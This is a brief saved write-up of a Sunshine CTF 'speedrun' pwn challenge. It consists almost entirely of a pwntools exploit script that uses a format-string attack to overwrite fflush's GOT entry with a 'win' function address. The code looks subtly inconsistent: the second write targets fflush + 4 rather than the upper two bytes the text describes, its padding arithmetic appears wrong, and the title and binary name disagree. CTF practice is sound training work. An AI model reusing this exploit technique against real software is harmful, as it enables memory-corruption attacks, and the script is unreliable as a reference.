## Sunshine CTF: speedrun 08 [pwn]

#### Just an exploit script I wanted to save. It showcases a format string attack using two writes to the upper and lower 2 bytes of a target address. Saving this for reference in future exploits.

```python
from pwn import *

#:
#p = process('./chall_11')
#binary = ELF('./chall_11', checksec = False)
#gdb.attach(p.pid, 'break *vuln + 83')
p = remote('chal.2020.sunshinectf.org', 30011)

fflush = 0x08049918
win = 0x80484e6
p.sendline('test')
p.sendline('{}{}%{}i%6$hn%{}i%7$hn'.format(p32(fflush), p32(fflush + 4), 0x84e6-8, 0x0804))
p.interactive()
```